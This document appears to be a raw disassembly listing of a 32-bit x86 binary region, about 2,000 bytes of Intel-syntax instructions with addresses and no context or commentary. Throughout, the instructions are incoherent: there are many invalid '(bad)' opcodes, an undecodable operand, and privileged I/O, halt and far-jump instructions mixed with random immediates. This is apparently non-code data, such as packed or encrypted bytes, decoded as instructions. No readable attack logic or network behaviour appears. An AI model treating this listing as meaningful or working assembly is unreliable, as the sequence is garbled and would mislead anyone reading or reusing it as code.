  413b6a:	retf   
  413b6b:	std    
  413b6c:	and    ch,cl
  413b6e:	fcom   QWORD PTR [esi-0x6f]
  413b71:	sar    DWORD PTR [ebp+eiz*4+0x288e91ac],1
  413b78:	pop    edx
  413b79:	cmp    eax,0x384d0918
  413b7e:	cmp    eax,0x5fdb4dc9
  413b83:	mov    edi,0xa0c25b79
  413b88:	sbb    eax,0xdbdf1caa
  413b8d:	out    0x1f,al
  413b8f:	out    dx,al
  413b90:	push   ebp
  413b91:	imul   ebx,ecx,0xffffffc1
  413b94:	add    BYTE PTR [ebx+0x3ec0ffcb],ah
  413b9a:	inc    ecx
  413b9b:	(bad)  
  413b9d:	loop   0x413b20
  413b9f:	sar    ebp,1
  413ba1:	data16 fwait
  413ba3:	or     eax,0x66dc75c1
  413ba8:	jno    0x413b4a
  413baa:	xor    BYTE PTR [esi],al
  413bac:	ss pop ebp
  413bae:	iret   
  413baf:	hlt    
  413bb0:	stos   BYTE PTR es:[edi],al
  413bb1:	pop    edx
  413bb2:	push   cs
  413bb3:	sbb    edx,DWORD PTR [esi-0x57]
  413bb6:	popf   
  413bb7:	sub    BYTE PTR [eax-0x18],0xdf
  413bbb:	pop    ss
  413bbc:	jmp    0x413c24
  413bbe:	js     0x413b65
  413bc0:	fisub  DWORD PTR [edi-0x6f]
  413bc3:	cld    
  413bc4:	push   cs
  413bc5:	push   ebx
  413bc6:	jmp    DWORD PTR [eax+0x7cc17f74]
  413bcc:	mov    ah,0x69
  413bce:	adc    BYTE PTR [ecx+edi*1],0x87
  413bd2:	sahf   
  413bd3:	cmp    ecx,DWORD PTR [eax-0x229b8d98]
  413bd9:	and    BYTE PTR [ebp+0x58],0x96
  413bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bde:	mov    dh,0x38
  413be0:	inc    ecx
  413be1:	adc    eax,0xc5573b0b
  413be6:	cmp    al,0x46
  413be8:	xchg   BYTE PTR [ebp+0x34979a28],ch
  413bee:	push   0xd08796a7
  413bf3:	mov    ah,0xb1
  413bf5:	fwait
  413bf6:	adc    DWORD PTR [ebx-0x2e],0xffffff9f
  413bfa:	fisttp QWORD PTR [edx]
  413bfc:	and    BYTE PTR [ecx],ah
  413bfe:	pushf  
  413bff:	int    0x71
  413c01:	mov    ecx,0xcb9b4a7e
  413c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c07:	rep lods al,BYTE PTR ds:[esi]
  413c09:	std    
  413c0a:	cmp    ebp,DWORD PTR [ebp+0x1bba759]
  413c10:	aas    
  413c11:	mov    al,ds:0xfb76203d
  413c16:	ret    0x2fd8
  413c19:	es (bad) 
  413c1c:	push   ebx
  413c1d:	lods   al,BYTE PTR ds:[esi]
  413c1e:	mov    al,0x13
  413c20:	test   ecx,esp
  413c22:	xchg   DWORD PTR [esp+eiz*4+0x436b5ffd],ebp
  413c29:	push   ss
  413c2a:	imul   eax,DWORD PTR [edi],0x212b4794
  413c30:	sub    BYTE PTR [ebx],ch
  413c32:	add    bl,BYTE PTR [edx]
  413c34:	cmp    bh,BYTE PTR [esi]
  413c36:	ud2    
  413c38:	popf   
  413c39:	pop    esp
  413c3a:	cmc    
  413c3b:	outs   dx,DWORD PTR ds:[esi]
  413c3c:	adc    BYTE PTR [edx],bl
  413c3e:	leave  
  413c3f:	pop    edi
  413c40:	js     0x413c58
  413c42:	jb     0x413bfc
  413c44:	mov    al,0x1a
  413c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c47:	fmul   st,st(7)
  413c49:	inc    ebx
  413c4a:	mov    ebx,0x76aaa943
  413c4f:	arpl   WORD PTR [edi-0x2e],sp
  413c52:	imul   ebp,DWORD PTR [esi+0x60],0xd40a97fb
  413c59:	call   0x67e9b49f
  413c5e:	mov    dh,0x18
  413c60:	pop    esi
  413c61:	out    dx,al
  413c62:	addr16 daa 
  413c64:	call   FWORD PTR [ebx-0x51]
  413c67:	sti    
  413c68:	xchg   edx,eax
  413c69:	adc    BYTE PTR [eax+0x77],dl
  413c6c:	aas    
  413c6d:	retf   0x85cf
  413c70:	lea    edx,[eax-0x61]
  413c73:	mov    gs,WORD PTR [ecx+ecx*2-0x498b4734]
  413c7a:	sub    eax,0x35e9153d
  413c7f:	push   ebp
  413c80:	imul   edi,DWORD PTR [ebp-0x2cc44a80],0x18
  413c87:	retf   
  413c88:	pop    ss
  413c89:	cmp    DWORD PTR [esi-0x30b77ee1],0xceed3d70
  413c93:	nop
  413c94:	push   0x554301f5
  413c99:	xor    esi,edi
  413c9b:	sar    DWORD PTR [edi],0x40
  413c9e:	repnz out 0x27,eax
  413ca1:	sar    bl,0xfe
  413ca4:	ffree  st(0)
  413ca6:	pop    es
  413ca7:	push   edx
  413ca8:	mov    WORD PTR [ecx-0x1a],es
  413cab:	das    
  413cac:	push   edx
  413cad:	sbb    esp,esp
  413caf:	jae    0x413c87
  413cb1:	pop    edx
  413cb2:	punpckldq mm4,DWORD PTR [eax-0x66]
  413cb6:	test   BYTE PTR [ebx+edi*1],ah
  413cb9:	add    DWORD PTR [ecx+0x50],ecx
  413cbc:	retf   
  413cbd:	jecxz  0x413c5a
  413cbf:	fmul   DWORD PTR [edx+0x19af7dc7]
  413cc5:	ja     0x413cbb
  413cc7:	les    ecx,FWORD PTR [ecx]
  413cc9:	cld    
  413cca:	ror    DWORD PTR fs:[esp+ebp*4+0x56],cl
  413ccf:	xchg   esi,eax
  413cd0:	or     eax,0xcf9e58d8
  413cd5:	(bad)  [esi+0x4aef1f34]
  413cdb:	lods   eax,DWORD PTR ds:[esi]
  413cdc:	mov    ah,0x3b
  413cde:	xchg   ebp,eax
  413cdf:	pusha  
  413ce0:	shl    BYTE PTR [edx+0x6a],0x58
  413ce4:	sub    BYTE PTR [edi+0x203b5251],bh
  413cea:	or     DWORD PTR [edi],0x504f5be4
  413cf0:	test   al,0xb8
  413cf3:	xchg   edi,eax
  413cf4:	xlat   BYTE PTR ds:[ebx]
  413cf5:	ret    0x5a70
  413cf8:	inc    esp
  413cf9:	sub    al,0x54
  413cfb:	sbb    BYTE PTR ds:0xc6553358,cl
  413d01:	popa   
  413d02:	pop    ebp
  413d03:	pop    ebx
  413d04:	mov    edx,0x2ca052b2
  413d09:	das    
  413d0a:	pop    edi
  413d0b:	bound  edx,QWORD PTR [ebx-0x297bcb1]
  413d11:	adc    eax,0x7c392c72
  413d16:	push   0xf
  413d18:	mov    edx,0xc9ecae37
  413d1d:	jns    0x413d22
  413d1f:	pusha  
  413d20:	add    eax,0x801a783a
  413d25:	mov    BYTE PTR [esi+0x1c27c16f],ch
  413d2b:	cmp    ebp,DWORD PTR [ebx+0x51]
  413d2e:	adc    bh,BYTE PTR [ebx]
  413d30:	rol    bh,cl
  413d32:	loop   0x413d92
  413d34:	arpl   WORD PTR [esi-0x74],bx
  413d37:	xchg   ecx,eax
  413d38:	mov    ds:0x81f538c6,eax
  413d3d:	dec    edi
  413d3e:	sub    edi,DWORD PTR [esi+ecx*8-0x1a]
  413d42:	shl    DWORD PTR [edx-0x61],1
  413d45:	xchg   esi,eax
  413d46:	xchg   esp,eax
  413d47:	ins    BYTE PTR es:[edi],dx
  413d48:	and    esp,DWORD PTR [edi-0x7f2e7dcc]
  413d4e:	daa    
  413d4f:	into   
  413d50:	mov    dh,0x51
  413d52:	xchg   esp,eax
  413d53:	jno    0x413d6a
  413d55:	lods   al,BYTE PTR ds:[esi]
  413d56:	repz cmp DWORD PTR [edi+0x5ce011d5],eax
  413d5d:	mov    dl,0x60
  413d5f:	lds    esp,FWORD PTR [edi+0x76625de5]
  413d65:	push   esi
  413d66:	dec    ecx
  413d67:	rol    esp,cl
  413d69:	retf   0xe5c7
  413d6c:	jns    0x413d40
  413d6e:	es mov esp,0x203d2f2
  413d74:	repnz mov edi,0xc3dd2ca2
  413d7a:	or     al,0xc1
  413d7c:	sub    edi,DWORD PTR [eax+0x2d]
  413d7f:	dec    esi
  413d80:	mov    es,WORD PTR [esi]
  413d82:	cs out dx,eax
  413d84:	popf   
  413d85:	(bad)  
  413d86:	push   eax
  413d87:	jmp    0xc31da602
  413d8c:	aam    0xf2
  413d8e:	test   eax,esi
  413d90:	scas   al,BYTE PTR es:[edi]
  413d91:	jmp    0x2d0f:0x4125520d
  413d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d99:	(bad)  
  413d9a:	in     al,dx
  413d9b:	test   DWORD PTR cs:[esi+0x67eb59f8],edi
  413da2:	sub    al,0x94
  413da4:	and    eax,0x7d6e513a
  413da9:	sbb    ecx,DWORD PTR ds:0xbabcddc3
  413daf:	test   DWORD PTR [ebp+0x21feb682],0x8368f178
  413db9:	sub    ch,BYTE PTR [ebx]
  413dbb:	pop    ss
  413dbc:	or     DWORD PTR [ecx-0x36],edx
  413dbf:	push   esi
  413dc0:	fimul  WORD PTR [edi+0x6709eba1]
  413dc6:	xchg   BYTE PTR [edi+esi*1+0x3d],dl
  413dca:	adc    al,BYTE PTR [ebx+0x581c733a]
  413dd0:	inc    edi
  413dd1:	fisub  WORD PTR [ebp+0x523b6482]
  413dd7:	adc    ecx,esi
  413dd9:	in     al,dx
  413dda:	pushf  
  413ddb:	mov    dl,0x66
  413ddd:	scas   al,BYTE PTR es:[edi]
  413dde:	cmp    BYTE PTR [eax-0x20f3f54],bh
  413de4:	adc    BYTE PTR ds:0xd2f85c11,ch
  413dea:	or     BYTE PTR [esi+0x63],0x7c
  413dee:	mov    ebx,0x8f1df6a0
  413df3:	cmp    ah,bl
  413df5:	(bad)  
  413df6:	mov    esi,0x8562f810
  413dfb:	dec    eax
  413dfc:	fimul  WORD PTR [ecx-0x27818f99]
  413e02:	lahf   
  413e03:	cld    
  413e04:	push   edx
  413e05:	shl    BYTE PTR [ecx+0x697d84c9],0x2b
  413e0c:	inc    esp
  413e0d:	iret   
  413e0e:	into   
  413e0f:	or     al,0x1a
  413e11:	cmp    bl,bh
  413e13:	mov    ch,0xcf
  413e15:	jnp    0x413e21
  413e17:	fisubr DWORD PTR [edx]
  413e19:	icebp  
  413e1a:	pop    edx
  413e1b:	dec    ecx
  413e1c:	out    0xf,al
  413e1e:	xchg   edi,eax
  413e1f:	les    ebp,FWORD PTR ds:0xdad77aa6
  413e25:	dec    esi
  413e26:	inc    ecx
  413e27:	adc    BYTE PTR [eax-0x72304d82],ah
  413e2d:	fwait
  413e2e:	xchg   ebx,eax
  413e2f:	(bad)  
  413e30:	rcr    DWORD PTR [ebx],cl
  413e32:	xchg   edi,eax
  413e33:	adc    eax,0x9f058521
  413e38:	rol    DWORD PTR [edx+0xe],cl
  413e3b:	std    
  413e3c:	(bad)  
  413e3d:	jle    0x413eb0
  413e3f:	adc    ecx,eax
  413e41:	aad    0x99
  413e43:	push   edi
  413e44:	dec    dl
  413e46:	fiadd  WORD PTR [ebp-0x4a]
  413e49:	imul   edi,DWORD PTR [bx+di-0x46],0xf9611a0
  413e51:	mov    bh,0x66
  413e53:	dec    ebx
  413e54:	icebp  
  413e55:	inc    eax
  413e56:	jle    0x413e0e
  413e58:	and    al,0x73
  413e5a:	(bad)  
  413e5b:	rol    BYTE PTR [esi-0x3af60a6b],1
  413e61:	daa    
  413e62:	stos   DWORD PTR es:[edi],eax
  413e63:	pop    ebx
  413e64:	rol    DWORD PTR [eax+0x77],0x5c
  413e68:	inc    edx
  413e69:	add    ah,BYTE PTR ds:0x2dc88b7e
  413e6f:	call   0x80a28a2f
  413e74:	cwde   
  413e75:	adc    BYTE PTR [edx],dh
  413e77:	pop    es
  413e78:	cld    
  413e79:	sbb    al,BYTE PTR [edi+0x7084a56]
  413e7f:	adc    ebp,esp
  413e81:	add    eax,0x2593c789
  413e86:	icebp  
  413e87:	xor    al,0x78
  413e89:	mov    ss,WORD PTR [edx-0x4c]
  413e8c:	imul   edx,DWORD PTR [ebp-0x30],0x81ea41e6
  413e93:	xchg   ecx,eax
  413e94:	or     al,0xb3
  413e96:	ret    
  413e97:	or     bh,BYTE PTR [ebx+ebx*2+0x2d]
  413e9b:	xchg   ebp,eax
  413e9c:	mov    esp,0x47674eab
  413ea1:	adc    dl,BYTE PTR [ebp+0x18]
  413ea4:	pop    edi
  413ea5:	outs   dx,DWORD PTR ds:[esi]
  413ea6:	retf   0x12c3
  413ea9:	mov    ebp,0xb28f594e
  413eae:	pusha  
  413eaf:	push   ss
  413eb0:	mov    esp,0xf0296916
  413eb5:	mov    edi,DWORD PTR [ebp+0x5489d7c0]
  413ebb:	out    0xe3,al
  413ebd:	hlt    
  413ebe:	xor    edx,ebx
  413ec0:	in     eax,dx
  413ec1:	test   ah,0x98
  413ec4:	mov    ds:0xf3ca8182,al
  413ec9:	or     eax,0xbbd80f4e
  413ece:	jae    0x413e6a
  413ed0:	ror    BYTE PTR [eax+0x5e356023],1
  413ed6:	and    eax,0x3fb1f4e6
  413edb:	fwait
  413edc:	js     0x413f45
  413ede:	sbb    eax,0x2e9da950
  413ee3:	and    BYTE PTR [edi+0x61119474],ah
  413ee9:	mov    bh,0x36
  413eeb:	or     DWORD PTR [esi+0x5aa0350c],edx
  413ef1:	in     al,0x5
  413ef3:	sbb    ch,cl
  413ef5:	push   esp
  413ef6:	and    eax,0x99304bc
  413efb:	inc    edi
  413efc:	push   esi
  413efd:	push   es
  413efe:	xor    ecx,ebp
  413f00:	sahf   
  413f01:	push   ds
  413f02:	or     cl,0xc8
  413f05:	add    BYTE PTR [edx-0x1a358e2f],ch
  413f0b:	mov    cl,dl
  413f0d:	sbb    eax,0xef9d2e82
  413f12:	xchg   BYTE PTR [edi+0xac60aaa],cl
  413f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f19:	sbb    al,0xe6
  413f1b:	mov    DWORD PTR [eax],ecx
  413f1d:	inc    eax
  413f1e:	in     al,dx
  413f1f:	sbb    al,0xf7
  413f21:	jp     0x413ef3
  413f23:	push   0xffffffa2
  413f25:	inc    ebx
  413f26:	add    DWORD PTR [ebx-0x25f68da1],ebx
  413f2c:	dec    ebx
  413f2d:	xchg   edx,eax
  413f2e:	loopne 0x413edc
  413f30:	dec    esp
  413f31:	dec    esi
  413f32:	mov    ds:0xbfc8781,al
  413f37:	shl    BYTE PTR [edi+eax*1],1
  413f3a:	pop    ecx
  413f3b:	adc    al,0xa9
  413f3d:	lods   al,BYTE PTR ds:[esi]
  413f3e:	jl     0x413eee
  413f40:	mov    ds:0x7ee8520f,eax
  413f45:	arpl   WORD PTR [esi],dx
  413f47:	bound  eax,QWORD PTR [edi-0x7d]
  413f4a:	pop    ebx
  413f4b:	or     al,0xe0
  413f4d:	jl     0x413f6b
  413f4f:	addr16 push es
  413f51:	sbb    eax,0xb3a47a90
  413f56:	inc    esp
  413f57:	repnz dec esp
  413f59:	clc    
  413f5a:	lea    ecx,[ebp-0x201fcf1c]
  413f60:	and    dh,BYTE PTR [ebx+ebp*1+0x6314c7da]
  413f67:	sets   dh
  413f6a:	popa   
  413f6b:	mov    ah,0x26
  413f6d:	imul   DWORD PTR [esi+0x20486a93]
  413f73:	aaa    
  413f74:	or     eax,0x75941ade
  413f79:	jae    0x413f5d
  413f7b:	dec    eax
  413f7c:	iret   
  413f7d:	sub    edx,DWORD PTR [eax+eax*4-0x12]
  413f81:	jb     0x413fde
  413f83:	and    DWORD PTR [ebx],ebp
  413f85:	inc    esi
  413f86:	je     0x413fbd
  413f88:	sbb    dh,al
  413f8a:	cmp    DWORD PTR [eax+0x78e51f55],eax
  413f90:	not    ecx
  413f92:	stos   BYTE PTR es:[edi],al
  413f93:	inc    ecx
  413f94:	dec    ebx
  413f95:	(bad)  
  413f97:	or     al,0x86
  413f99:	shl    ebp,cl
  413f9b:	repnz xchg esp,eax
  413f9d:	pop    ss
  413f9e:	cmp    eax,0x5faf5a6a
  413fa3:	sub    al,0x59
  413fa5:	push   eax
  413fa6:	iret   
  413fa7:	adc    DWORD PTR [ecx+0x76],ebp
  413faa:	lock push ss
  413fac:	inc    eax
  413fad:	xchg   DWORD PTR [ebp+ebx*1+0x3dc0d9b2],ebx
  413fb4:	jmp    0x414020
  413fb6:	xchg   ebp,eax
  413fb7:	std    
  413fb8:	js     0x414021
  413fba:	mov    cl,0x78
  413fbc:	jbe    0x413f86
  413fbe:	leave  
  413fbf:	push   edi
  413fc0:	out    dx,eax
  413fc1:	sub    DWORD PTR [edx],ecx
  413fc3:	scas   eax,DWORD PTR es:[edi]
  413fc4:	sahf   
  413fc5:	dec    esi
  413fc6:	mov    edi,0x4853ca87
  413fcb:	in     al,0xb2
  413fcd:	imul   edi,DWORD PTR [eax+0x10],0xf34e15da
  413fd4:	fwait
  413fd5:	pop    eax
  413fd6:	xor    DWORD PTR [eax],esi
  413fd8:	div    dl
  413fda:	ror    ecx,0xa2
  413fdd:	test   DWORD PTR [esi-0x6e8609b0],edi
  413fe3:	test   eax,0x86cedbe9
  413fe8:	mov    ds:0x5e43977d,eax
  413fed:	xor    edi,edx
  413fef:	jge    0x41403e
  413ff1:	(bad)  
  413ff2:	sar    BYTE PTR [edx+0x35f15772],1
  413ff8:	push   eax
  413ff9:	lods   al,BYTE PTR ds:[esi]
  413ffa:	add    esi,ecx
  413ffc:	rcr    ebx,1
  413ffe:	jmp    0x8ab7a1ea
  414003:	dec    edi
  414004:	stc    
  414005:	shl    BYTE PTR [esi],cl
  414007:	fwait
  414008:	data16 adc dl,dh
  41400b:	add    ebx,esi
  41400d:	loopne 0x414005
  41400f:	mov    al,ds:0x4489c1b2
  414014:	push   eax
  414015:	adc    BYTE PTR [esi+0x2b],dl
  414018:	push   0x43
  41401a:	test   al,0xd0
  41401c:	push   edi
  41401d:	test   al,0x65
  41401f:	mov    dl,0x93
  414021:	mov    ecx,0x4c5a370f
  414026:	jb     0x413fcf
  414028:	jae    0x413fe1
  41402a:	(bad)
  41402e:	xchg   ecx,eax
  41402f:	dec    esi
  414030:	sub    esp,DWORD PTR [ebp+edx*2+0x10]
  414034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414035:	rcl    DWORD PTR ds:0xdef3e653,0x17
  41403c:	adc    eax,0x2e177526
  414041:	jae    0x414063
  414043:	jnp    0x414050
  414045:	loopne 0x413fd4
  414047:	enter  0x805d,0xbe
  41404b:	js     0x413ff8
  41404d:	jbe    0x413ffc
  41404f:	cmp    eax,0x69cd2b65
  414054:	mov    ds:0x82b93115,al
  414059:	cld    
  41405a:	and    eax,0xdeb2d32e
  41405f:	add    bh,cl
  414061:	or     ah,ah
  414063:	adc    eax,0xb5c458db
  414068:	(bad)  
  414069:	push   0xb062eb2f
  41406e:	push   ebp
  41406f:	adc    esi,ecx
  414071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414072:	xchg   esi,eax
  414073:	sbb    ch,ah
  414075:	repz jnp 0x414051
  414078:	dec    esp
  414079:	sub    DWORD PTR [eax-0x66],ebp
  41407c:	pop    ebp
  41407d:	xor    BYTE PTR [ecx-0x2b1a86b6],cl
  414083:	dec    edx
  414084:	jmp    0xc7678fb8
  414089:	add    ah,ch
  41408b:	loopne 0x41408c
  41408d:	aas    
  41408e:	sar    DWORD PTR [edx-0x4a7c0aea],1
  414094:	adc    BYTE PTR [ebx-0x2bbad0c7],0x5c
  41409b:	inc    edi
  41409c:	dec    eax
  41409d:	out    0x15,al
  41409f:	sub    cl,BYTE PTR [edx+ebx*8-0x1a]
  4140a3:	add    BYTE PTR [edi+0x2dd7c7dd],ch
  4140a9:	push   es
  4140aa:	stc    
  4140ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ac:	adc    BYTE PTR ds:0x203396a7,dh
  4140b2:	cmp    al,0xf1
  4140b4:	xchg   ebp,eax
  4140b5:	jo     0x41403b
  4140b7:	sub    ebx,DWORD PTR [ecx-0x43f2b286]
  4140bd:	mov    esi,0x677fcf9
  4140c2:	cmp    ch,BYTE PTR [eax-0x1be9e623]
  4140c8:	test   al,0x33
  4140ca:	cli    
  4140cb:	addr16 adc eax,0xe8260b6c
  4140d1:	nop
  4140d2:	es cmp eax,0x46642b3a
  4140d8:	jae    0x414123
  4140da:	push   edi
  4140db:	push   0xdb6463d
  4140e0:	add    al,0xf
  4140e2:	scas   eax,DWORD PTR es:[edi]
  4140e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140e4:	and    eax,0x59860e7c
  4140e9:	aad    0x46
  4140eb:	cmc    
  4140ec:	lds    esi,FWORD PTR [eax]
  4140ee:	neg    DWORD PTR [edx-0x1b6d405]
  4140f4:	xor    bl,al
  4140f6:	adc    ch,BYTE PTR [ecx]
  4140f8:	xchg   ecx,eax
  4140f9:	test   BYTE PTR [edi],bl
  4140fb:	test   eax,0x3538836b
  414100:	pop    edi
  414101:	dec    ebp
  414102:	pop    ds
  414103:	cmp    ebx,DWORD PTR [esi]
  414105:	or     BYTE PTR [ebp-0x475fe38d],dh
  41410b:	int    0x1b
  41410d:	mov    edi,0xf794f77a
  414112:	sub    eax,0x401eae12
  414117:	sub    bl,BYTE PTR [edx+edi*8-0x22]
  41411b:	sub    DWORD PTR [ebx+0x54],eax
  41411e:	aad    0x42
  414120:	fld    TBYTE PTR [edx]
  414122:	jp     0x414144
  414124:	sbb    BYTE PTR [eax],dh
  414126:	out    dx,eax
  414127:	lea    esp,[esi]
  414129:	pop    esp
  41412a:	outs   dx,DWORD PTR ds:[esi]
  41412b:	cwde   
  41412c:	adc    ah,BYTE PTR [esi-0x14aa1fc8]
  414132:	jle    0x414175
  414134:	sti    
  414135:	cdq    
  414136:	adc    bh,dl
  414138:	clc    
  414139:	jp     0x4140fd
  41413b:	iret   
  41413c:	sbb    ah,cl
  41413e:	popa   
  41413f:	pop    esi
  414140:	sar    BYTE PTR [ebp+0x6828252],cl
  414146:	inc    esp
  414147:	push   edx
  414148:	shl    DWORD PTR [esi-0x41],0xb8
  41414c:	cmp    bh,bl
  41414e:	cmp    eax,0xc9779060
  414153:	(bad)  
  414154:	and    eax,0x65b4014e
  414159:	scas   eax,DWORD PTR es:[edi]
  41415a:	repnz push ss
  41415c:	sbb    ch,BYTE PTR [edx+0x71]
  41415f:	std    
  414160:	mov    ds:0x52374026,al
  414165:	mov    eax,ds:0xecd92693
  41416a:	scas   al,BYTE PTR es:[edi]
  41416b:	push   ebx
  41416c:	hlt    
  41416d:	lahf   
  41416e:	iret   
  41416f:	je     0x4141d5
  414171:	fistp  QWORD PTR [eax]
  414173:	cmp    esp,DWORD PTR [esi-0x4febf199]
  414179:	sbb    DWORD PTR [ebx+0x17],esp
  41417c:	inc    esp
  41417d:	pushf  
  41417e:	or     dl,cl
  414180:	sar    BYTE PTR [ecx+0xb],1
  414183:	cmp    eax,0x66936088
  414188:	repnz inc eax
  41418a:	sbb    cl,bl
  41418c:	ins    DWORD PTR es:[edi],dx
  41418d:	ins    DWORD PTR es:[edi],dx
  41418e:	fsub   QWORD PTR [edi]
  414190:	mov    edi,esi
  414192:	and    esp,ecx
  414194:	aad    0xbf
  414196:	inc    ebx
  414197:	aaa    
  414198:	xor    al,BYTE PTR [ebp+0x8]
  41419b:	faddp  st(5),st
  41419d:	(bad)  
  41419e:	imul   eax,DWORD PTR [eax+0x32],0x5afb2647
  4141a5:	aam    0x67
  4141a7:	and    dh,BYTE PTR [edi+edi*8+0x52]
  4141ab:	xchg   ebp,eax
  4141ac:	fwait
  4141ad:	mov    ebx,0xb54919f8
  4141b2:	aas    
  4141b3:	or     edi,ecx
  4141b5:	mov    dh,0xe5
  4141b7:	(bad)  
  4141b8:	retf   
  4141b9:	test   DWORD PTR [ebp-0x1f],eax
  4141bc:	mov    edi,0xb12c4f7e
  4141c1:	fimul  WORD PTR [esi+edx*2+0x7e]
  4141c5:	in     eax,dx
  4141c6:	mov    fs,WORD PTR [edi-0x38]
  4141c9:	fistp  WORD PTR [edi]
  4141cb:	push   ds
  4141cc:	icebp  
  4141cd:	cdq    
  4141ce:	(bad)  
  4141cf:	(bad)  
  4141d0:	sub    dh,BYTE PTR [esi-0x33]
  4141d3:	xor    bl,BYTE PTR [esi+0x19]
  4141d6:	inc    ecx
  4141d7:	test   DWORD PTR [edi],edi
  4141d9:	les    ebx,FWORD PTR [edi+0x5a]
  4141dc:	mov    edi,0x74912e88
  4141e1:	clc    
  4141e2:	push   0x384cf66b
  4141e7:	add    DWORD PTR [ebx+0x5a707dd7],ebx
  4141ed:	fst    QWORD PTR [ebx-0x7a590203]
  4141f3:	mov    ebp,0xd25c5779
  4141f8:	pop    ecx
  4141f9:	(bad)  
  4141fa:	sti    
  4141fb:	push   eax
  4141fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141fd:	out    dx,al
  4141fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ff:	nop
  414200:	sub    al,0x98
  414202:	les    ebp,FWORD PTR [ecx]
  414204:	and    eax,DWORD PTR [edi+0x6c]
  414207:	pop    esp
  414208:	xchg   esi,eax
  414209:	adc    ebx,DWORD PTR [ebx+0x1f]
  41420c:	nop
  41420d:	out    0xd9,al
  41420f:	and    BYTE PTR [edi+0x2bbfc5a5],ah
  414215:	scas   eax,DWORD PTR es:[edi]
  414216:	xor    al,0xbc
  414218:	dec    ecx
  414219:	dec    esp
  41421a:	les    ebx,FWORD PTR [eax-0x6c]
  41421d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41421e:	loopne 0x414271
  414220:	enter  0x92b,0x2d
  414224:	lods   eax,DWORD PTR ds:[esi]
  414225:	xchg   BYTE PTR [ebp+0x2ddc7e63],cl
  41422b:	cwde   
  41422c:	retf   
  41422d:	fwait
  41422e:	pop    edi
  41422f:	xchg   edx,eax
  414230:	loop   0x414243
  414232:	arpl   si,dx
  414234:	test   bl,al
  414236:	jbe    0x4141f2
  414238:	pusha  
  414239:	mov    al,BYTE PTR [ebx-0x68]
  41423c:	dec    esp
  41423d:	cli    
  41423e:	and    edx,0xffffff8e
  414241:	cs sub al,0x72
  414244:	bound  ebp,QWORD PTR [esi-0x4f]
  414247:	or     DWORD PTR [esi+ebp*8-0x5f],0xb2d0c44a
  41424f:	fcom   QWORD PTR ds:0xddc8e2c6
  414255:	lods   al,BYTE PTR ds:[esi]
  414256:	int    0x9b
  414258:	hlt    
  414259:	lods   al,BYTE PTR ds:[esi]
  41425a:	scas   al,BYTE PTR es:[edi]
  41425b:	and    esp,DWORD PTR [esi-0x34]
  41425e:	cdq    
  41425f:	nop
  414260:	hlt    
  414261:	jg     0x414261
  414263:	call   0xf587:0x5dfe4078
  41426a:	adc    BYTE PTR ds:0x923e3907,0x30
  414271:	mov    dh,0xd
  414273:	in     al,0x1c
  414275:	out    0x14,eax
  414277:	mov    eax,0x66d5473
  41427c:	xor    BYTE PTR [ebp+edx*2-0x654d629d],ch
  414283:	pop    ebp
  414284:	ss sub edx,edi
  414287:	xchg   bl,bl
  414289:	cmp    eax,0xe209713e
  41428e:	and    bh,0x20
  414291:	mov    eax,0xc556fc34
  414296:	sti    
  414297:	xchg   esp,eax
  414298:	add    eax,DWORD PTR [edx]
  41429a:	into   
  41429b:	sbb    eax,0xf59e1d50
  4142a0:	push   ss
  4142a1:	mov    ?,WORD PTR [eax+0x3a7fca8f]
  4142a7:	mov    ah,BYTE PTR [edi+0x39]
  4142aa:	retf   
  4142ab:	repz mov bh,BYTE PTR [ecx-0x5911a681]
  4142b2:	fist   WORD PTR [ebp+0x43]
  4142b5:	sti    
  4142b6:	adc    DWORD PTR [eax],ebx
  4142b8:	test   al,0x58
  4142ba:	or     al,0x63
  4142bc:	jb     0x414298
  4142be:	dec    ebp
  4142bf:	nop
  4142c0:	and    al,0x1f
  4142c2:	outs   dx,BYTE PTR ds:[esi]
  4142c3:	mov    cs,WORD PTR [edx-0x66]
  4142c6:	es loope 0x41432e
  4142c9:	and    al,0x24
  4142cb:	loopne 0x41429a
  4142cd:	enter  0xfcd5,0x23
  4142d1:	sub    BYTE PTR ds:0x54b35edb,al
  4142d7:	cmp    DWORD PTR [edi],ebx
  4142d9:	and    eax,0xc8d91e34
  4142de:	lds    eax,FWORD PTR [edi+0x53775d00]
  4142e4:	(bad)  
  4142e5:	jmp    0x414328
  4142e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e8:	adc    DWORD PTR [ebx-0x31e67388],esp
  4142ee:	mov    al,0x67
  4142f0:	jb     0x414318
  4142f2:	nop
  4142f3:	cs aam 0xee
  4142f6:	push   ds
  4142f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f8:	aam    0xec
  4142fa:	xor    ah,BYTE PTR [ebp+0x33fbc685]
  414300:	mov    edx,0x7f7742f6
  414305:	dec    esi
  414306:	in     al,0x17
  414308:	inc    ecx
  414309:	hlt    
  41430a:	inc    esp
  41430b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41430c:	xor    esp,DWORD PTR [edx+0x70]
  41430f:	out    dx,eax
  414310:	xchg   ebp,eax
  414311:	sbb    eax,0xb924a398
  414316:	xor    BYTE PTR [ecx-0x3920b2a5],cl
  41431c:	pop    eax
  41431d:	(bad)  
  41431e:	cmc    
  41431f:	pop    ecx
  414320:	es push esi
  414322:	icebp  
  414323:	xchg   edx,eax
  414324:	jne    0x414370
  414326:	inc    edi
  414327:	cld    
  414328:	bound  esi,QWORD PTR [ebx-0x7329b521]
  41432e:	aad    0xc7
  414330:	add    al,0x80
  414332:	dec    ebx
  414333:	add    DWORD PTR [eax+0x6745e92d],ebp
  414339:	sub    BYTE PTR [edi+0x24],al
  41433c:	jo     0x41438b
  41433e:	mov    ds:0xdd8fd305,eax
  414343:	dec    ebp
  414344:	ror    DWORD PTR [esp+ebx*4-0x36],1
